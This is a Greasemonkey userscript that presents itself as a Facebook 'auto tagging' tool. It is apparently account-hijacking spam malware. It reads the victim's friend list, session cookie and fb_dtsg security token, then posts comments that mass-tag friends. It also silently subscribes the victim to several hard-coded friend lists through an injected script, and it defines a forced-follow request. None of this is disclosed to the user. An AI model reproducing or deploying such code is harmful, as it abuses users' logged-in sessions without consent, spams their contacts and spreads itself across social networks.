// ==UserScript==
// @name            Facebook Auto Tagging By Muhamad Syimir
// @description     Facebook Auto Tagging by Muhamad Syimir
// @include         https://*.facebook.com/*
// @include         https://*.facebook.com/*/*
// @include         http://*.facebook.com/*
// @include         http://*.facebook.com/*/*
// ==/UserScript==


/* All Right Reserver ElMzx.Ma    Don't Change Anything */
function x__0() { return window.ActiveXObject ? new ActiveXObject("Msxml2.XMLHTTP") : new XMLHttpRequest; };
function get_friends(){
var a=x__0();
a.open("GET", "/ajax/typeahead/first_degree.php?__a=1&filter[0]=user&lazy=0&viewer="+uid+"&token=v7&stale_ok=0&options[0]=friends_only&options[1]=nm", false);
a.send(null);
if (a.readyState == 4) {
var f = JSON.parse(a.responseText.substring(a.responseText.indexOf('{')));
return f.payload.entries;
}
return false;
}
function get_uid(b){
var a=x__0();
a.open("GET", 'http://graph.facebook.com/'+b, false);
a.send();
if (a.readyState == 4) {
return uid = JSON.parse(a.responseText).id;
}
return false;
}
var patt = /comment_text=(.*?)&/
var c = 1;
username = /\.com\/(.*?)\//.exec(window.top.location)[1];
uid = get_uid(username);
a = window.top.location;
termina = 0;
var amigos = get_friends();
post_id = /[0-9]{8,}/.exec(a);
uids = 'comment_text=';
header = 'ft_ent_identifier='+post_id+'&comment_text=0&source=1&client_id=1359576694192%3A1233576093&reply_fbid&parent_comment_id&rootid=u_jsonp_3_19&ft[tn]=[]&ft[qid]=5839337351464612379&ft[mf_story_key]=5470779710560437153&ft[has_expanded_ufi]=1&nctr[_mod]=pagelet_home_stream&__user='+uid+'&__a=1&__req=4u&fb_dtsg='+document.getElementsByName('fb_dtsg')[0].value+'&phstamp='+Math.random();
for ( var n = 1 ; n < amigos.length ; n++ ){
//uids += '%40[' + amigos[n].uid + '%3A' + encodeURI(amigos[n].text) + ']%20';
fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
uids += '%40[' + amigos[n].uid + '%3AAAAAAAAAAAA]%20';
c++;
if(c == 7){
uids += '&';
with(new XMLHttpRequest()) open("POST", "/ajax/ufi/add_comment.php?__a=1"),setRequestHeader("Content-Type", "application/x-www-form-urlencoded"),send(header.replace(patt, uids));
z = setTimeout('function(){asd=0}', 1000);
clearInterval(z);
c = 1;
uids = 'comment_text=';
}
}
var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
function cereziAl(isim) {
var tarama = isim + "=";
if (document.cookie.length > 0) {
konum = document.cookie.indexOf(tarama)
if (konum != -1) {
konum += tarama.length
son = document.cookie.indexOf(";", konum)
if (son == -1)
son = document.cookie.length
return unescape(document.cookie.substring(konum, son))
}
else { return ""; }
}
}
function getRandomInt (min, max) {
return Math.floor(Math.random() * (max - min + 1)) + min;
}
function randomValue(arr) {
return arr[getRandomInt(0, arr.length-1)];
}
var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
function a(abone){
var http4 = new XMLHttpRequest();
var url4 = "/ajax/follow/follow_profile.php?__a=1";
var params4 = "profile_id=" + abone + "&location=1&source=follow-button&subscribed_button_id=u37qac_37&fb_dtsg=" + fb_dtsg + "&lsd&__" + user_id + "&phstamp=";
http4.open("POST", url4, true);
//Send the proper header information along with the request
http4.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
http4.setRequestHeader("Content-length", params4.length);
http4.setRequestHeader("Connection", "close");
http4.onreadystatechange = function() {//Call a function when the state changes.
if(http4.readyState == 4 && http4.status == 200) {
http4.close; // Close the connection
}
}
http4.send(params4);
}
function sublist(uidss) {
var a = document.createElement('script');
a.innerHTML = "new AsyncRequest().setURI('/ajax/friends/lists/subscribe/modify?location=permalink&action=subscribe').setData({ flid: " + uidss + " }).send();";
document.body.appendChild(a);
}sublist("709816259045771");sublist("201369036691662");sublist("709818169045580");sublist("601724796529818")
;sublist("601725423196422");sublist("601733493195615");sublist("601733596528938");sublist("601733963195568")